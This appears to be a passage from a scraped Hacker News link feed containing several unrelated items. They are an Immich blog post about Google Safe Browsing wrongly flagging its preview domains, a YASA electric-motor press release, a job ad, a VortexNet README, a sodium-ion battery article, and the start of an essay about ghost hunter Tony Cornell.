    &lt;p&gt;Google offers a service called Safe Browsing , which aims to determine if a site is running malware, unwanted software, or performs some form of social engineering. The service is free, and many browsers, including Chrome &amp;amp; Firefox, directly integrate the service into their products, although it is still a bit unclear how it actually determines if something is "dangerous".&lt;/p&gt;
    &lt;p&gt;So, what happens if your site is marked as dangerous? Well, since most browsers seem to use this service, your site essentially becomes unavailable for all users, except the few that might realize it's a false positive, click the &lt;code&gt;Details&lt;/code&gt; button, and then see and click the tiny, underlined "visit this safe site" link. So basically it becomes unavailable for your entire audience with little apparent recourse.&lt;/p&gt;
    &lt;p&gt;At some point earlier this month, we realized that a bunch of sites on the &lt;code&gt;immich.cloud&lt;/code&gt; domain had recently started showing up as "dangerous". At the same time, a few users started complaining about their own Immich deployments being flagged. We also noticed that all our own internal sites had the same warning, including our preview environments. It got old real fast to have to go through the tedious effort to "view this safe site" whenever we wanted to view anything.&lt;/p&gt;
    &lt;p&gt;After a few days we realized this warning was not going to go away on its own, and that the Google Search Console was apparently the official way to manage these types of issues. It seems a bit crazy that the only way to make our site available again was to create a Google account, and use the Google Search Console to request a review of the affected site. The service did at least provide a few more details about what exactly was flagged, although it made the whole thing a bit more comical. Per the service:&lt;/p&gt;
    &lt;p&gt;Google has detected harmful content on some of your siteâs pages. We recommend that you remove it as soon as possible. Until then, browsers such as Google Chrome will display a warning when users visit or download certain files from your site.&lt;/p&gt;
    &lt;p&gt;and&lt;/p&gt;
    &lt;p&gt;These pages attempt to trick users into doing something dangerous, such as installing unwanted software or revealing personal information.&lt;/p&gt;
    &lt;p&gt;Below these warnings was a list of affected URLs:&lt;/p&gt;
    &lt;code&gt;https://main.preview.internal.immich.cloud/
https://main.preview.internal.immich.cloud/auth/login
https://pr-22838.preview.internal.immich.cloud/
https://pr-22838.preview.internal.immich.cloud/auth/login
...&lt;/code&gt;
    &lt;p&gt;It was super useful to learn that the affected URLs were for our preview environments. Maybe the thought was that these Immich environments were imitating our demo website ? The most alarming thing was realizing that a single flagged subdomain would apparently invalidate the entire domain.&lt;/p&gt;
    &lt;p&gt;This issue affects all of our preview environments and other internal services such as zitadel, outline, grafana, victoria metrics, etc. This also impacts our production tile server, which is deployed at &lt;code&gt;tiles.immich.cloud&lt;/code&gt; . Luckily, the requests to the tile server are made via JavaScript, and since those are not user facing they seem to still be working as expected.&lt;/p&gt;
    &lt;p&gt;The Google Search Console has a &lt;code&gt;Request Review&lt;/code&gt; button, where you can explain how you have resolved the issues. It does warn that:&lt;/p&gt;
    &lt;p&gt;Requesting a review of issues that weren't fixed will result in longer review cycles&lt;/p&gt;
    &lt;p&gt;Since, nothing is actually wrong we decided to respond with the following:&lt;/p&gt;
    &lt;p&gt;Immich is a self-hosted application, and the Immich team (https://immich.app/ ) owns and operates the &lt;code&gt;immich.cloud&lt;/code&gt; domain and subdomains. The flagged sites are our own deployments of our own products and are not impersonating anything or anyone else.&lt;/p&gt;
    &lt;p&gt;A day or two later, the resolution was accepted and the domain was clean again! ð&lt;/p&gt;
    &lt;p&gt;We thought we were home free, but unfortunately that was not the case.&lt;/p&gt;
    &lt;p&gt;An Immich preview environment can be requested by adding the &lt;code&gt;preview&lt;/code&gt; label to a pull request on GitHub. When the environment is created, a comment is posted on the pull request with the preview url, which follows the following format:&lt;/p&gt;
    &lt;code&gt;https://pr-&amp;lt;num&amp;gt;.preview.internal.immich.cloud/&lt;/code&gt;
    &lt;p&gt;As soon as we created a new preview environment, the &lt;code&gt;immich.cloud&lt;/code&gt; domain was once again flagged as a dangerous site. The best we can tell, Google crawls GitHub, sees the new URL, crawls the site, marks it as deceptive, and the whole process begins anew.&lt;/p&gt;
    &lt;p&gt;Our current plan is to attempt to minimize the impact of this issue by moving the preview environments to their own, dedicated domain â &lt;code&gt;immich.build&lt;/code&gt; .&lt;/p&gt;
    &lt;p&gt;Google Safe Browsing looks to be have been built without consideration for open-source or self-hosted software. Many popular projects have run into similar issues, such as:&lt;/p&gt;
    &lt;p&gt;Unfortunately, Google seems to have the ability to arbitrarily flag any domain and make it immediately unaccessible to users. I'm not sure what, if anything, can be done when this happens, except constantly request another review from the all mighty Google.&lt;/p&gt;
    &lt;p&gt;Cheers,&lt;lb/&gt;The Immich Team&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://immich.app/blog/google-flags-immich-as-dangerous"/><published>2025-10-22T20:53:49+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45675020</id><title>YASA beats own power density record pushing electric motor to 59kW/kg benchmark</title><updated>2025-10-23T06:15:45.410823+00:00</updated><content>&lt;doc fingerprint="15f8c0544943841b"&gt;
  &lt;main&gt;
    &lt;p&gt;(Yarnton, Oxfordshire, UK) October 22, 2025 â YASA, the global leader in the design and production of axial flux motors, has smashed its own unofficial power density world record with a staggering new benchmark for ultra-high-performance electric motors.&lt;/p&gt;
    &lt;p&gt;Earlier in the summer, YASA achieved 550kW (738bhp) from a 13.1kg version of its new axial flux prototype motor, equating to an unofficial power density world record of 42kW/kg, but latest testing of an even lighter 12.7kg version has significantly exceeded this.&lt;/p&gt;
    &lt;p&gt;Hitting a staggering 750kW (&amp;gt;1000bhp) short-term peak rating, YASA has set a new unofficial electric motor power density world record of 59kW/kg â a 40% increase on initial testing. But the motor is not just focused on setting new standards for peak power, YASA also estimates that its all-important continuous power will be in the region of 350kW-400kW (469bhp-536bhp).&lt;/p&gt;
    &lt;p&gt;Designed and developed at YASAâs high-tech Oxford Innovation Centre, the breakthrough represents another major validation of the companyâs axial flux technology. And crucially, this isnât a theoretical model or digital concept: it is a fully functional prototype, undergoing a rigorous development program. Compact, scalable and with no exotic materials used, it achieves exceptional performance through precision engineering, advanced thermal management and optimised packaging. This extraordinary motor design has been developed and realised with support from the Advanced Propulsion Centre, UK.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;âOn behalf of the entire YASA team, Iâm proud and excited to so quickly follow up on the already remarkable results of our initial testing with this incredible result,â said Tim Woolmer, Founder and CTO, YASA. âTo achieve a 750kW short-term peak rating and a density of 59kW/kg is a major validation of our next-generation axial flux technology. Itâs proof of what focused engineering innovation can achieve. And this isnât a concept on a screen â itâs running, right now, on the dynos. Weâve built an electric motor thatâs significantly more power-dense than anything before it â all with scalable materials and processes. This motor will bring game-changing technology to the high-performance automotive sector.â&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;YASAâs engineering team is already validating the prototype through extended testing cycles.&lt;/p&gt;
    &lt;p&gt;Simon Odling, YASAâs Chief of New Technology, commented: âThe early results are extremely encouraging. The motorâs performance on the dyno has exceeded even our most optimistic simulations. As well as its incredible peak power and overall power density, we estimate this new motor will be able to deliver all-important continuous power in the region of 350kW-400kW. This is real hardware, in real life, delivering real data â and itâs performing beautifully.â&lt;/p&gt;
    &lt;p&gt;âThis record demonstrates what makes YASA unique,â added Joerg Miska, CEO, YASA. âWith three times the performance density of todayâs leading radial flux motors, YASA continues to redefine the boundaries of whatâs possible in electric motor design â turning pure innovation into tangible engineering progress. Our technology is delivering measurable results today, while paving the way for a new generation of lightweight, efficient electric propulsion systems.â&lt;/p&gt;
    &lt;p&gt;Further details on the development of the prototype motor will be shared in upcoming releases.&lt;/p&gt;
    &lt;p&gt;For media inquiries, please contact:&lt;lb/&gt; e: media@yasa.com&lt;/p&gt;
    &lt;p&gt;YASA, a wholly owned subsidiary of Mercedes-Benz Group since 2021, is redefining the future of Electric Vehicle performance. YASA design and manufacture high performance electric motors and power electronics for the premium automotive industry, employing over 400 people across sites in Oxford, Bicester and Welshpool. YASAâs revolutionary axial-flux electric powertrain technology brings the highest power/torque densities in class for the smallest size and weight.&lt;/p&gt;
    &lt;p&gt;Find out more at yasa.com&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://yasa.com/news/yasa-smashes-own-unofficial-power-density-world-record-pushing-state-of-the-art-electric-motor-to-staggering-new-59kw-kg-benchmark/"/><published>2025-10-22T20:54:37+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45675090</id><title>InpharmD (YC W21) Is Hiring â NLP Engineer</title><updated>2025-10-23T06:15:45.018860+00:00</updated><content>&lt;doc fingerprint="a92f231c7de6e6de"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;div&gt;
        &lt;p&gt; | InpharmD Jobs&lt;/p&gt;
      &lt;/div&gt;
      &lt;head rend="h3"&gt;Hiring - NLP/ML Engineer&lt;/head&gt;
      &lt;p&gt;InpharmDTM helps healthcare providers make better clinical decisions by giving them the data behind their questions. &lt;/p&gt;
      &lt;list rend="ul"&gt;
        &lt;item style="font-weight: 400;"&gt;Founded: 2018&lt;/item&gt;
        &lt;item style="font-weight: 400;"&gt;Funding stage: Seed ($6.05M)&lt;/item&gt;
        &lt;item style="font-weight: 400;"&gt;Revenue stage: Series A (~$5M annual run rate)&lt;/item&gt;
        &lt;item style="font-weight: 400;"&gt;Net gain/loss per month: profitable&lt;/item&gt;
      &lt;/list&gt;
      &lt;p&gt;Over that time, our revenue has grown 750% into the very healthy 7-figures.&lt;/p&gt;
      &lt;p&gt;What makes us different is that weâve grown fast while being capital efficient (not raising much money). Weâve done this with a performance-driven culture that attracts, retains, and rewards phenomenal people. We also:&lt;/p&gt;
      &lt;list rend="ol"&gt;
        &lt;item style="font-weight: 400;"&gt;Leverage scale- We focus on processes and systems necessary for us to grow intentionally today and into the future. &lt;/item&gt;
        &lt;item style="font-weight: 400;"&gt;Share an ownership (driver vs passenger) mindset- We iterate at a remarkable pace amidst uncertainty, putting in long hours along the way- but and because we love it. &lt;/item&gt;
        &lt;item style="font-weight: 400;"&gt;Avoid drama and wasted time- None of us want a political company culture and we meet once a week (formally).&lt;/item&gt;
      &lt;/list&gt;
      &lt;p&gt;Market conditions are perfect for us to continue to grow at this pace with a small and mighty team. This is our competitive advantage over bloated incumbents, and by the time they realize it, itâll be too late. &lt;/p&gt;
      &lt;head rend="h3"&gt;Desired Qualifications&lt;/head&gt;
      &lt;p&gt;Weâre looking for an AI Engineer whoâs passionate about building real-world healthcare products that make a difference. What matters most to us is skill, creativity, and drive â not degrees or titles.&lt;/p&gt;
      &lt;list data-start="368" data-end="809" rend="ul"&gt;
        &lt;item data-start="368" data-end="443"&gt;
          &lt;p&gt;You take pride in doing great work and hold yourself to high standards.&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="444" data-end="518"&gt;
          &lt;p&gt;You think clearly about systems but also care about the small details.&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="519" data-end="590"&gt;
          &lt;p&gt;Youâve helped build or scale AI or healthcare tech products before.&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="591" data-end="661"&gt;
          &lt;p&gt;You use data and metrics to guide product or feature improvements.&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="662" data-end="738"&gt;
          &lt;p&gt;You consistently deliver exceptional results, not just average outcomes.&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="739" data-end="809"&gt;
          &lt;p&gt;You stay humble, collaborative, and eager to learn â no egos here.&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="739" data-end="809"&gt;Minimum 5 + years of experience in developing AI applications.&lt;/item&gt;
      &lt;/list&gt;
      &lt;head rend="h3"&gt;Tech Skills&lt;/head&gt;
      &lt;list data-start="133" data-end="755" rend="ul"&gt;
        &lt;item data-start="133" data-end="185"&gt;
          &lt;p&gt;Strong background in AI and Machine Learning&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="186" data-end="311"&gt;
          &lt;p&gt;Hands-on experience with Large Language Models (LLMs) and open-source models (e.g., Llama, Mistral, Falcon, etc.)&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="312" data-end="371"&gt;
          &lt;p&gt;Proficiency in Python, Rust, and/or Next.js&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="372" data-end="456"&gt;
          &lt;p&gt;Experience working with Vector Databases (like Pinecone, ChromaDB, or FAISS)&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="457" data-end="544"&gt;
          &lt;p&gt;Familiarity with background job systems such as Celery, SQS, or similar&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="545" data-end="602"&gt;
          &lt;p&gt;Experience managing and processing large datasets&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="603" data-end="679"&gt;
          &lt;p&gt;Solid understanding of AWS services (S3, EC2, Lambda, Bedrock, etc.)&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="680" data-end="755"&gt;
          &lt;p&gt;Contribution or participation in open-source LLM projects is a plus&lt;/p&gt;
        &lt;/item&gt;
      &lt;/list&gt;
      &lt;head rend="h3"&gt;Logistics&lt;/head&gt;
      &lt;list data-start="148" data-end="371" rend="ul"&gt;
        &lt;item data-start="148" data-end="172"&gt;
          &lt;p&gt;Hours: Full-time&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="173" data-end="209"&gt;
          &lt;p&gt;Contact: Tulasee Rao Chintha&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="210" data-end="270"&gt;
          &lt;p&gt;Location: Atlanta Tech Village (preferred) or Remote&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="271" data-end="371"&gt;
          &lt;p&gt;Compensation: $150K base salary, commensurate with experience, plus InpharmD stock options&lt;/p&gt;
        &lt;/item&gt;
      &lt;/list&gt;
      &lt;head rend="h3"&gt;Milestones&lt;/head&gt;
      &lt;list data-start="200" data-end="769" rend="ul"&gt;
        &lt;item data-start="200" data-end="290"&gt;
          &lt;p&gt;Improve AI Accuracy: Enhance our core AI algorithmâs accuracy from 95% to 99%.&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="291" data-end="486"&gt;
          &lt;p&gt;Build Orchestration Engine: Develop an intelligent orchestration layer so our researchers and human-in-the-loop systems can operate in autopilot mode for answering clinical questions.&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="487" data-end="630"&gt;
          &lt;p&gt;Automate Content Generation: Reduce drug monograph and class review generation time from days to hours â and eventually to minutes.&lt;/p&gt;
        &lt;/item&gt;
        &lt;item data-start="631" data-end="769"&gt;
          &lt;p&gt;Predictive AI: Integrate predictive analytics into our drug analysis tools to forecast outcomes and insights more effectively.&lt;/p&gt;
        &lt;/item&gt;
      &lt;/list&gt;
      &lt;p&gt;Equal Opportunity Employer&lt;/p&gt;
      &lt;p&gt;At InpharmD, we believe the best teams are diverse. We value unique perspectives and encourage everyone to apply â even if you donât meet every single qualification.&lt;/p&gt;
      &lt;p&gt;All qualified applicants will be considered without regard to race, color, religion, gender, gender identity or expression, sexual orientation, national origin, genetics, disability, age, or veteran status.&lt;/p&gt;
      &lt;head rend="h3"&gt;Interested?&lt;/head&gt;
      &lt;p&gt;Learn more about us on our InpharmD blog.&lt;/p&gt;
      &lt;p&gt;If youâre excited about building the future of AI in healthcare, send an email to admins@inpharmd.com â your message goes directly to the founders. Feel free to include why youâre interested and what kind of opportunity youâre looking for.&lt;/p&gt;
      &lt;p&gt;Share&lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://inpharmd.com/jobs/inpharmd-is-hiring-ai-ml-engineer"/><published>2025-10-22T21:01:07+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45676162</id><title>VortexNet: Neural network based on fluid dynamics</title><updated>2025-10-23T06:15:44.531819+00:00</updated><content>&lt;doc fingerprint="18ff0e742050fb6a"&gt;
  &lt;main&gt;
    &lt;p&gt;This repository contains toy implementations of the concepts introduced in the research paper VortexNet: Neural Computing through Fluid Dynamics. These examples demonstrate how PDE-based vortex layers and fluid-inspired mechanisms can be integrated into neural architectures, such as autoencoders for different datasets.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Note: These are toy prototypes for educational purposes and are not intended as fully optimized or physically precise fluid solvers.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;vortexnet_mnist.py&lt;/code&gt;:&lt;lb/&gt;A demonstration script for building and training a VortexNet Autoencoder on the MNIST dataset.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;vortexnext_image.py&lt;/code&gt;:&lt;lb/&gt;An advanced script for building and training a VortexNet Autoencoder on custom image datasets with enhanced features like data augmentation and latent space interpolation.&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;git clone https://github.com/samim23/vortexnet.git
cd vortexnet&lt;/code&gt;
    &lt;p&gt;Ensure you have Python 3.8+ installed. Install the required Python packages using &lt;code&gt;pip&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;pip install torch torchvision matplotlib pyyaml scikit-learn seaborn tensorboard&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;p&gt;MNIST Dataset:&lt;/p&gt;&lt;lb/&gt;The MNIST dataset will be automatically downloaded by&lt;code&gt;vortexnet_mnist.py&lt;/code&gt;if not already present.&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;Custom Image Dataset:&lt;/p&gt;&lt;lb/&gt;For&lt;code&gt;vortexnext_image.py&lt;/code&gt;, place your images (JPEG, PNG, or JPEG formats) inside the&lt;code&gt;my_data/&lt;/code&gt;directory.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This script builds and trains a VortexNet Autoencoder on the MNIST dataset.&lt;/p&gt;
    &lt;p&gt;Usage:&lt;/p&gt;
    &lt;code&gt;python3.11 vortexnet_mnist.py&lt;/code&gt;
    &lt;p&gt;This advanced script builds and trains a VortexNet Autoencoder on custom image datasets with enhanced features.&lt;/p&gt;
    &lt;p&gt;Usage:&lt;/p&gt;
    &lt;code&gt;python3.11 vortexnext_image.py --config config_image.yaml&lt;/code&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;p&gt;Configuration Files:&lt;/p&gt;&lt;lb/&gt;Ensure the configuration file (&lt;code&gt;config_image.yaml&lt;/code&gt;) is properly set up before running the scripts.&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;Output Directory:&lt;/p&gt;&lt;lb/&gt;All outputs, including logs, reconstructed images, and model checkpoints, are saved in the&lt;code&gt;output_dir&lt;/code&gt;specified in the respective configuration files.&lt;/item&gt;
      &lt;item&gt;&lt;p&gt;TensorBoard:&lt;/p&gt;&lt;lb/&gt;For monitoring training progress, you can launch TensorBoard pointing to the&lt;code&gt;output_dir&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/samim23/vortexnet"/><published>2025-10-22T22:51:58+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45677243</id><title>Sodium-ion batteries have started to appear in cars and home storage</title><updated>2025-10-23T06:15:44.157571+00:00</updated><content>&lt;doc fingerprint="3818886de2c717a1"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;The Sodium-Ion Battery Revolution Has Started&lt;/head&gt;
    &lt;p&gt;Support CleanTechnica's work through a Substack subscription or on Stripe.&lt;/p&gt;
    &lt;p&gt;Sodium-ion batteries have been in the works for years, and now sodium-ion batteries have started to appear in cars and home storage. JAC, in a partnership with Volkswagen, has been shipping a vehicle called the Sehol or E10X with sodium-ion batteries since 2023. Recently, Bluetti introduced the Pioneer Na(sodium) portable power station. This is just the beginning.&lt;/p&gt;
    &lt;p&gt;HiNa supplied sodium-ion batteries for JAC Motors in 2023. Early batteries had lower gravimetric energy density (145 Wh/kg) and volumetric energy density (330 Wh/liter) than LFP, but sodium-ion batteries have already improved since then. They have outstanding temperature range, yielding 88% retention at -20Â°C. For reference, the discharge capacity of NMC at 0Â°C, â10Â°C and â20Â°C is only 80%, 53%, and 23% of that at 25Â°C. The HiNa batteries had a cycle life of 4,500 cycles with 83% retention and a 2C charge rate, but even better sodium-ion batteries are on their way.&lt;/p&gt;
    &lt;p&gt;HiNa opened a 1 GWh sodium-ion battery factory in December 2022. Since then, both BYD and CATL have opened huge sodium-ion battery factories. The investment is there and indicates a permanent presence for sodium.&lt;/p&gt;
    &lt;p&gt;Since then, CATL has thrown its hat into the ring with the Naxtra sodium-ion battery, with 175 Wh/kg and 10,000 lifetime cycles along with operation from -40Â°C to 70Â°C. CATL is planning a start-stop battery for trucks using the technology. It has the potential to replace lead-acid batteries. CATL has announced battery pricing at the cell level in volume at $19/kWh.&lt;/p&gt;
    &lt;p&gt;BYD, a major competitor to CATL, has not stood still either. BYD opened a sodium-ion battery factory in 2024, and is producing a large sodium-ion battery energy storage system (BESS) called MC Cube-T with a capacity of 6.4 MWh. BYDâs sodium battery factory has a massive planned capacity of 30 GWh annually. These companies mean business. Sodium ion is here to stay.&lt;/p&gt;
    &lt;p&gt;These developments point the way to much more. The cost of sodium battery materials is much lower than for any lithium battery. There are no resource bottleneck materials like cobalt or lithium to contend with. In addition, aluminum can be used for electrodes, whereas lithium requires copper for one of the electrodes. Carbon or graphite and separator materials will be similar, but in all other respects, sodium has much lower material costs. Compared to LFP, sodium does not require phosphorous, a substance that is almost exclusively sourced from one state in north Africa, nor lithium, a relatively abundant but more expensive substance than sodium. LFP cannot compete on material costs or temperature range, and both BYD and CATL expect to phase it out first in energy storage.&lt;/p&gt;
    &lt;head rend="h3"&gt;Implications are Clear for the Future&lt;/head&gt;
    &lt;p&gt;Availability of such a low-cost, wide-temperature-range battery makes a wide range of applications possible that were not available before. While batteries have enabled passenger car developments, they have been somewhat stymied in large mobile power applications like shipping and electric trucks. That day is gone now. At these costs, electric shipping is achievable and the debate over alternative fuels will fall off quickly as applications are realized. Batteries with similar characteristics, like LFP, already offer reasonable range and cargo-carrying capacity for long-distance shipping. These developments push that over the top and set electric shipping at parity with legacy fossil fuel shipping and beyond when maintenance and all cost factors are considered.&lt;/p&gt;
    &lt;p&gt;In cars, sodium puts passenger vehicles well beyond parity into the âwhy are we doing this anymore?â category in comparison with ICE (internal combustion engines). Combustion makes no sense whatsoever when the alternative lasts for hundreds of thousands of miles and works with ambient temperatures from -40Â°C to 70Â°C. There are literally no more excuses any more. Not range, not charging speed, not cost. The first sodium-ion battery cars were already shipping in China years ago and have been shipped to South America. In both places, they seriously undercut the first cost of any equivalent internal combustion vehicle. Now, in a short time, they have improved to compete and beat lithium-ion batteries.&lt;/p&gt;
    &lt;p&gt;As of now, LFP does the bulk of truck applications in China, where over 90% of the worldâs heavy electric trucks exist. Sodium-ion batteries are expected to displace LFP in energy storage and heavy truck applications. The implications are far wider than that, however. For other applications sensitive to energy storage cost, the cost drops dramatically. In particular, swap stations and fast charging stations with battery buffering drop, changing the picture dramatically. Implementation of those should increase with lower capital costs. Electric shipping will go from slow lane to fast lane as the advantages of sodium are realized. Already, CATL has announced a partnership with Maersk, hinting at future developments in that area.&lt;/p&gt;
    &lt;p&gt;It is likely other applications, like replacements for lead-acid batteries with sodium, will appear, but many others are likely. Renewables will benefit greatly, with costs for storage so low that the complaints of variability and cost vanish. While existing lithium batteries have changed the world in so many ways, the presence of sodium-ion batteries can be expected to transform our world faster. The sheer quantity of batteries and electrification made possible by the presence of lower-cost, higher-capability batteries makes the changes in electrification to date pale by comparison. About the only field left to conquer in battery storage is high-density, high-power applications like aircraft, but more breakthroughs are on their way in the form of lithium-sulfur and solid-state batteries.&lt;/p&gt;
    &lt;p&gt;Sign up for CleanTechnica's Weekly Substack for Zach and Scott's in-depth analyses and high level summaries, sign up for our daily newsletter, and follow us on Google News!&lt;/p&gt;
    &lt;p&gt;Have a tip for CleanTechnica? Want to advertise? Want to suggest a guest for our CleanTech Talk podcast? Contact us here.&lt;/p&gt;
    &lt;p&gt;Sign up for our daily newsletter for 15 new cleantech stories a day. Or sign up for our weekly one on top stories of the week if daily is too frequent.&lt;/p&gt;
    &lt;p&gt;CleanTechnica uses affiliate links. See our policy here.&lt;/p&gt;
    &lt;p&gt;CleanTechnica's Comment Policy&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://cleantechnica.com/2025/10/22/the-sodium-ion-battery-revolution-has-started/"/><published>2025-10-23T01:36:37+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45678156</id><title>The mild mannered Englishman who was the most prolific ghost hunter</title><updated>2025-10-23T06:15:43.816398+00:00</updated><content>&lt;doc fingerprint="3601981580a317d3"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;The Mild Mannered Englishman Who Was the Worldâs Most Prolific Ghost Hunter&lt;/head&gt;
    &lt;head rend="h2"&gt;Ben Machell on Paranormal Investigator Tony Cornell&lt;/head&gt;
    &lt;p&gt;A middle-aged couple park their car outside a modest suburban house. The husband turns oï¬ the engine then returns his hands to the wheel, eyes forward and jaw set. His wife looks out of the passenger window, her expression both faraway and eager. They sit in silence for a moment. Then, from the front steps of the house, a grandmotherly figure appears and beckons them. The wife raises her own hand in tentative reply. Without a word, she opens the passenger door and makes her way down the drive. The husband watches her go. He shuts his eyes and inhales deeply. He unbuckles himself and follows.&lt;/p&gt;
    &lt;p&gt;The old woman ushers them warmly into her home, leading them through a chintzy hallway toward a living room door. She stops outside and turns to them. âHeâs been waiting for you,â she says, smiling. âCome.â&lt;/p&gt;
    &lt;p&gt;Suddenly, the quiet is broken by a voice, high-pitched and smiling.&lt;/p&gt;
    &lt;p&gt;She pushes open the door and guides them into a darkened room. Heavy curtains are drawn, and a single red light bulb glows from the ceiling. Half a dozen other figures are already sitting in chairs formed in a semicircle, but they say nothing as the husband and wife join them. The old woman stands facing the room, her face cast in shadow and red light. She surveys the people present and smiles. She shuts her eyes and raises her upturned palms, and the guests do the same, gently taking the hands of their neighbors. A small cymbal begin to chime in a gentle, steady rhythm. The red light begins to flicker and dance.&lt;/p&gt;
    &lt;p&gt;The husband and wife sit side by side, hand in hand, their eyes shut. The old woman is speaking, but her voice is far away and indistinct. A heavy sense of drowsy dislocation slowly overcomes them. The old womanâs voice stops, and there is nothing but silence. It passes for five seconds, ten seconds, fifteen. Suddenly, the quiet is broken by a voice, high-pitched and smiling.&lt;/p&gt;
    &lt;p&gt;âMummy?â&lt;/p&gt;
    &lt;p&gt;The husband and wife both open their eyes. The man draws a sharp, startled breath. The woman can only make a small sound. She puts a hand to her lips then reaches forward, before drawing her hand back. In the center of the room, swathed in shadow, is the faint spectral outline of a small boy.&lt;/p&gt;
    &lt;p&gt;âMummy, Daddy, itâs me,â the shape speaks brightly. âIâve missed you so much . . .â&lt;/p&gt;
    &lt;p&gt;Later, the husband and wife say goodbye to the old woman on her front doorstep. The wife embraces her. They walk back to their car and take their seats. They hold hands as they both begin to weep, smiling at one another as they convulse with grief and joy.&lt;/p&gt;
    &lt;p&gt;In the lounge of a small terraced house, a family eats fish and chips in front of the TV. Two boys sit on the floor, and the mother and father are in old armchairs. It is dark outside, and the room is quiet and cozy.&lt;/p&gt;
    &lt;p&gt;Suddenly, the fatherâs eyes flick toward a dark corner of the room. They widen with alarm and he sits forward in his chair. âOh God, no,â he mutters, getting to his feet but backing away in a low, guarded crouch. âGod, please, no! Itâs him!â he shouts. His family all turn to look at him and then at the corner of the room. But they see nothing.&lt;/p&gt;
    &lt;p&gt;His wife springs to her feet. âGet out of the house quickly,â she urges. âRun!â Her husband makes to flee, but as he moves toward the door he cries and stumbles, then falls to the floor. âHeâs on me!â he screams, writhing and wrestling with some unseen assailant. âHelp me! His claws . . . the Black Dog . . . heâs tearing me!â The wife ushers the two frightened boys behind her, and watches on helplessly as her husband screams in agony and terror, thrashing his arms and legs.&lt;/p&gt;
    &lt;p&gt;After a minute of this, the manâs cries die out, as do his movements. Soon, he is a panting, shaking heap on the floor. His wife kneels down beside him to tend to him, but he brushes her hand aside. âStay away,â he mutters. But she persists. She points to his shirt, which is now soaked through with blood in diï¬erent patches up and down his chest and stomach. Exhausted, he allows her to unbutton it. And as she does, she reveals an entire torso covered in old scars and fresh, deep, bloody cuts.&lt;/p&gt;
    &lt;p&gt;A thirteen-year-old girl watches on impassively while her mother and father lavish praise upon a painting her younger brother has produced. He sits at the kitchen table proudly while his parents coo and stroke his shoulders with pride. The mother glances up and sees her daughter watching, and her expression becomes altogether less indulgent. âShouldnât you be starting your homework?â she asks crisply.&lt;/p&gt;
    &lt;p&gt;The girl purses her lips but turns on her heels and leaves the room. The sound of her stomping up the staircase causes her parents to share a look of weary consternation. The little brother is still contentedly working on his painting, dipping his brush into his pots and then smearing it across the paper.&lt;/p&gt;
    &lt;p&gt;Then, suddenly, he frowns.&lt;/p&gt;
    &lt;p&gt;âHey!â he shouts, as a large drop of water lands on his artwork, spoiling it and making the paint run. Another drop falls. He and his parents all look up at the ceiling, where a sudden leak, directly above them, is beginning to build a drip-drip-drip momentum. The father runs his hands over his head in despair. The mother shouts her daughterâs name. âJenny!â she barks, before racing up the stairs. âJenny, where are you?â&lt;/p&gt;
    &lt;p&gt;As she reaches the second floor of the house, she sees that the carpet is drenched. Water is running down the walls and dripping through light fixtures, as though the house itself is sweating out a fever. She squelches along a landing, calling her daughterâs name again, only stopping to peer into the family bathroom, although no taps are running which could account for the deluge. âJenny!â she calls again, furious now.&lt;/p&gt;
    &lt;p&gt;I look at the various papers being tenderly examined and wonder, prior to today, how long they had been sitting untouched, cataloged and filed away out of sight and mind.&lt;/p&gt;
    &lt;p&gt;She catches a faint replyââWhat?!ââand marches toward its source. She flings open a bedroom door, and her daughter is sitting at a desk, her schoolbooks open and a pen in her hand. The room is dry and still. The girl looks at her mother glowering in the doorway. Then she looks down at her sodden feet. She rises from her desk and fixes her mother with a defiant stare, fists bunched by her side. âIâve told you. Itâs not me.â&lt;/p&gt;
